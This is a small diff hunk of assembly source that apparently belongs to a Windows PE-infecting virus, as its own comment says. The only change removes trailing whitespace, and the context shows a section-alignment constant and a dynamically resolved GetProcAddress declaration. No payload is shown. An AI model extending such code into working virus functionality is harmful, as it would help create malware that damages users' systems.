@@ -6,7 +6,7 @@
 PE_SECTION_ALIGNMENT EQU 10000h
 
 ; Procedure descriptions for all of the REQUIRED_APIs. Specifying
-; these lets the assembler check our argument types and generate 
+; these lets the assembler check our argument types and generate
 ; the right preamble/postamble for functions the virus resolves
 ; dynamically at runtime.
 DESC_RUNTIME_API GetProcAddress, <baseAddr:DWORD,name:DWORD>
